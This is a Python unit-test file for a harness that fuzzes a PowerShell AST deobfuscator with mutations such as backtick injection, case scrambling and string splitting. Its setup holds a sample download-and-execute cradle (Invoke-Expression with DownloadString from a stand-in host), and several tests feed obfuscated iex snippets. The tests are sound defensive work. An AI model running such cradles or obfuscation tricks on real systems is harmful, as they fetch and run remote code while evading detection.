"""
Unit and Integration Tests for PowerShell AST Deobfuscation Regression Fuzzing Harness.
Tests script mutation strategies, runner execution, delta-debugging shrinker, reports, and CLI integration.
"""

import json
import os
import subprocess
import sys
import tempfile
import unittest

from src.fuzz_models import (
    FuzzExecutionResult,
    FuzzMutationRecord,
    FuzzStatus,
    FuzzSummary,
    FuzzTestCase,
    MutationStrategy,
)
from src.fuzz_mutator import PowerShellScriptMutator
from src.fuzz_runner import PowerShellFuzzRunner
from src.fuzzing import (
    fuzz_script,
    mutate_script,
    run_fuzz_harness,
    to_json_report,
    to_markdown_report,
    to_text_report,
)


class TestPowerShellScriptMutator(unittest.TestCase):
    """Verifies deterministic script mutation strategies and adversarial generators."""

    def setUp(self):
        self.mutator = PowerShellScriptMutator(seed=1337)
        self.sample_code = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"

    def test_deterministic_seed_reproducibility(self):
        """Verifies that the same seed produces identical mutations."""
        mutator1 = PowerShellScriptMutator(seed=999)
        case1 = mutator1.generate_mutated_case(self.sample_code, "test", num_mutations=3)

        mutator2 = PowerShellScriptMutator(seed=999)
        case2 = mutator2.generate_mutated_case(self.sample_code, "test", num_mutations=3)

        self.assertEqual(case1.mutated_code, case2.mutated_code)
        self.assertEqual(len(case1.mutations), len(case2.mutations))

    def test_backtick_injection(self):
        """Verifies backticks are injected into identifier and string tokens."""
        mutated, records = self.mutator.inject_backticks(self.sample_code, count=3)
        self.assertIn("`", mutated)
        self.assertTrue(len(records) > 0)
        self.assertEqual(records[0].strategy, MutationStrategy.BACKTICK_INJECTION)

    def test_case_scramble(self):
        """Verifies letter casing is randomized while preserving overall string length."""
        mutated, records = self.mutator.scramble_case("Invoke-Expression", ratio=1.0)
        self.assertNotEqual("Invoke-Expression", mutated)
        self.assertEqual(len("Invoke-Expression"), len(mutated))
        self.assertTrue(len(records) > 0)
        self.assertEqual(records[0].strategy, MutationStrategy.CASE_SCRAMBLE)

    def test_whitespace_mutation(self):
        """Verifies whitespace injection with tabs, spaces, and linebreaks."""
        mutated, records = self.mutator.mutate_whitespace(self.sample_code, count=4)
        self.assertGreater(len(mutated), len(self.sample_code))
        self.assertEqual(records[0].strategy, MutationStrategy.WHITESPACE_MUTATION)

    def test_comment_injection(self):
        """Verifies inline and block comments are injected into the code."""
        mutated, records = self.mutator.inject_comments(self.sample_code, count=2)
        self.assertTrue("#" in mutated or "<#" in mutated)
        self.assertEqual(records[0].strategy, MutationStrategy.COMMENT_INJECTION)

    def test_nesting_stress(self):
        """Verifies deeply nested subexpression and parentheses wrappers."""
        mutated, records = self.mutator.stress_nesting("Write-Host 1", depth=6)
        self.assertIn("Write-Host 1", mutated)
        self.assertTrue(mutated.startswith("$(") or mutated.startswith("(") or mutated.startswith("@("))
        self.assertEqual(records[0].strategy, MutationStrategy.NESTING_STRESS)

    def test_format_string_shuffle(self):
        """Verifies string literal transformation into shuffled format expressions."""
        code = "'Invoke-Expression' 'calc.exe'"
        mutated, records = self.mutator.shuffle_format_strings(code)
        self.assertIn("-f", mutated)
        self.assertTrue(len(records) > 0)
        self.assertEqual(records[0].strategy, MutationStrategy.FORMAT_STRING_SHUFFLE)

    def test_string_split_concat(self):
        """Verifies string literals are split and joined with concatenation operators."""
        code = "'DownloadString'"
        mutated, records = self.mutator.split_and_concat_strings(code)
        self.assertIn("+", mutated)
        self.assertTrue(len(records) > 0)
        self.assertEqual(records[0].strategy, MutationStrategy.STRING_SPLIT_CONCAT)

    def test_array_mangle(self):
        """Verifies array expression mangling with unary commas and indexing."""
        mutated, records = self.mutator.mangle_array_expressions("Get-Process")
        self.assertTrue("," in mutated or "@" in mutated or "[" in mutated)
        self.assertEqual(records[0].strategy, MutationStrategy.ARRAY_MANGLE)

    def test_type_accelerator_mangle(self):
        """Verifies type accelerator mangling and wrapping."""
        code = "[char[]](73, 69, 88)"
        mutated, records = self.mutator.mangle_type_accelerators(code)
        self.assertTrue(len(records) > 0)
        self.assertEqual(records[0].strategy, MutationStrategy.TYPE_MANGLE)

    def test_unicode_edge_injection(self):
        """Verifies injection of special Unicode characters (BOM, zero-width space)."""
        mutated, records = self.mutator.inject_unicode_edges("Write-Output 'test'")
        self.assertTrue(any(ord(c) > 127 for c in mutated))
        self.assertEqual(records[0].strategy, MutationStrategy.UNICODE_EDGE)

    def test_syntax_corruption(self):
        """Verifies intentional syntax corruption injection."""
        mutated, records = self.mutator.corrupt_syntax("Write-Output 'hello'")
        self.assertTrue(len(records) > 0)
        self.assertEqual(records[0].strategy, MutationStrategy.SYNTAX_CORRUPTION)

    def test_decoy_injection(self):
        """Verifies dead code and decoy branches are injected."""
        mutated, records = self.mutator.inject_decoys("Start-Service wuauserv")
        self.assertIn("decoy", mutated.lower())
        self.assertEqual(records[0].strategy, MutationStrategy.DECOY_INJECTION)

    def test_range_stress(self):
        """Verifies range expression injection."""
        mutated, records = self.mutator.stress_ranges("calc.exe")
        self.assertIn("..", mutated)
        self.assertEqual(records[0].strategy, MutationStrategy.RANGE_STRESS)

    def test_pipe_chain(self):
        """Verifies pipeline stage chaining."""
        mutated, records = self.mutator.chain_pipes("Get-ChildItem")
        self.assertIn("|", mutated)
        self.assertEqual(records[0].strategy, MutationStrategy.PIPE_CHAIN)

    def test_generate_adversarial_template(self):
        """Verifies generation of synthetic edge case templates."""
        nested = self.mutator.generate_adversarial_template("nesting", depth=5)
        self.assertIn("core_payload", nested)
        self.assertIn("$(", nested)

        fmt_shuffle = self.mutator.generate_adversarial_template("format_shuffle")
        self.assertIn("-f", fmt_shuffle)


class TestPowerShellFuzzRunner(unittest.TestCase):
    """Verifies batch fuzz runner, exception classification, shrinker, and reporting."""

    def setUp(self):
        self.runner = PowerShellFuzzRunner(seed=42, enable_shrink=True)

    def test_run_clean_case(self):
        """Verifies a standard obfuscated snippet executes with PASS status."""
        case = FuzzTestCase(
            test_id="case_clean_01",
            seed=42,
            base_name="clean_test",
            original_code="i`Ex ('c'+'alc.exe')",
            mutated_code="i`Ex ('c'+'alc.exe')",
        )
        res = self.runner.run_case(case)
        self.assertEqual(res.status, FuzzStatus.PASS)
        self.assertIn("calc.exe", res.deobfuscated_code)
        self.assertTrue(res.is_idempotent)
        self.assertGreater(res.ast_node_count, 0)

    def test_run_handled_syntax_error(self):
        """Verifies malformed syntax triggers HANDLED_SYNTAX_ERROR rather than a crash."""
        case = FuzzTestCase(
            test_id="case_syntax_err_01",
            seed=42,
            base_name="corrupt_test",
            original_code="Write-Output 'hello'",
            mutated_code="Write-Output 'hello' { unclosed brace",
        )
        res = self.runner.run_case(case)
        self.assertEqual(res.status, FuzzStatus.HANDLED_SYNTAX_ERROR)
        self.assertIsNotNone(res.error_message)
        self.assertEqual(res.exception_type, "SyntaxError")

    def test_delta_debugging_shrinker(self):
        """Verifies that the shrinker reduces a failing snippet."""
        failing_multi_line = (
            "Write-Output 'line1'\n"
            "Write-Output 'line2'\n"
            "Write-Output 'line3'\n"
        )
        # Even on non-crashing code, shrinker returns a valid minimal string
        shrunk = self.runner.shrink_failing_case(failing_multi_line, max_steps=5)
        self.assertIsInstance(shrunk, str)

    def test_batch_fuzz_harness_execution(self):
        """Verifies batch harness run across 15 iterations with 100% safety pass rate."""
        summary = self.runner.run_fuzz_harness(iterations=15, use_corpus=False)
        self.assertEqual(summary.total_cases, 15)
        self.assertEqual(summary.unexpected_crashes, 0)
        self.assertEqual(summary.pass_rate, 100.0)
        self.assertGreater(len(summary.strategy_counts), 0)

    def test_fuzz_with_specific_strategy(self):
        """Verifies batch harness filtered to a specific strategy."""
        summary = self.runner.run_fuzz_harness(
            iterations=5,
            strategies=[MutationStrategy.BACKTICK_INJECTION],
            use_corpus=False,
        )
        self.assertEqual(summary.total_cases, 5)
        self.assertIn("backtick_injection", summary.strategy_counts)

    def test_report_generation(self):
        """Verifies text, markdown, and json report formatting."""
        summary = self.runner.run_fuzz_harness(iterations=5, use_corpus=False)

        text_rep = self.runner.to_text_report(summary)
        self.assertIn("POWERSHELL AST DEOBFUSCATOR - REGRESSION FUZZING HARNESS REPORT", text_rep)
        self.assertIn("Overall Safety Pass Rate", text_rep)

        md_rep = self.runner.to_markdown_report(summary)
        self.assertIn("# PowerShell AST Deobfuscation Fuzzing Report", md_rep)
        self.assertIn("| **Total Test Runs** |", md_rep)

        json_rep = self.runner.to_json_report(summary)
        data = json.loads(json_rep)
        self.assertEqual(data["total_cases"], 5)
        self.assertIn("results", data)

    def test_save_report_file(self):
        """Verifies persisting report to a destination file."""
        summary = self.runner.run_fuzz_harness(iterations=3, use_corpus=False)
        rep = self.runner.to_text_report(summary)

        with tempfile.TemporaryDirectory() as tmpdir:
            out_file = os.path.join(tmpdir, "fuzz_report.txt")
            self.runner.save_report(rep, out_file)
            self.assertTrue(os.path.exists(out_file))
            with open(out_file, "r", encoding="utf-8") as f:
                content = f.read()
            self.assertIn("POWERSHELL AST DEOBFUSCATOR", content)


class TestFuzzingPublicFacade(unittest.TestCase):
    """Verifies public module facade convenience functions."""

    def test_mutate_script(self):
        """Verifies mutate_script convenience function."""
        code = "iex 'calc.exe'"
        case = mutate_script(code, seed=123, num_mutations=2)
        self.assertIsInstance(case, FuzzTestCase)
        self.assertEqual(case.original_code, code)

    def test_fuzz_script(self):
        """Verifies fuzz_script convenience function."""
        code = "Write-Host 'hello world'"
        result = fuzz_script(code)
        self.assertIsInstance(result, FuzzExecutionResult)
        self.assertEqual(result.status, FuzzStatus.PASS)

    def test_run_fuzz_harness_facade(self):
        """Verifies run_fuzz_harness top-level function."""
        summary = run_fuzz_harness(iterations=5, seed=77, use_corpus=False)
        self.assertIsInstance(summary, FuzzSummary)
        self.assertEqual(summary.total_cases, 5)


class TestFuzzingCLI(unittest.TestCase):
    """Verifies command-line interface execution for fuzzing options."""

    def test_cli_fuzz_text(self):
        """Verifies CLI execution with --fuzz flag."""
        cmd = [
            sys.executable,
            "-m",
            "src.cli",
            "--fuzz",
            "--fuzz-iterations",
            "5",
            "--fuzz-seed",
            "100",
        ]
        proc = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0, f"CLI stderr: {proc.stderr}")
        self.assertIn("POWERSHELL AST DEOBFUSCATOR - REGRESSION FUZZING HARNESS REPORT", proc.stdout)

    def test_cli_fuzz_json_output(self):
        """Verifies CLI execution with --fuzz-format json."""
        cmd = [
            sys.executable,
            "-m",
            "src.cli",
            "--fuzz",
            "--fuzz-iterations",
            "3",
            "--fuzz-format",
            "json",
        ]
        proc = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0)
        data = json.loads(proc.stdout)
        self.assertEqual(data["total_cases"], 3)
        self.assertEqual(data["unexpected_crashes"], 0)

    def test_cli_fuzz_report_destination(self):
        """Verifies CLI execution with --fuzz-report output path."""
        with tempfile.TemporaryDirectory() as tmpdir:
            report_path = os.path.join(tmpdir, "report.md")
            cmd = [
                sys.executable,
                "-m",
                "src.cli",
                "--fuzz",
                "--fuzz-iterations",
                "3",
                "--fuzz-format",
                "markdown",
                "--fuzz-report",
                report_path,
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True, encoding="utf-8")
            self.assertEqual(proc.returncode, 0)
            self.assertTrue(os.path.exists(report_path))
            with open(report_path, "r", encoding="utf-8") as f:
                content = f.read()
            self.assertIn("# PowerShell AST Deobfuscation Fuzzing Report", content)


if __name__ == "__main__":
    unittest.main()
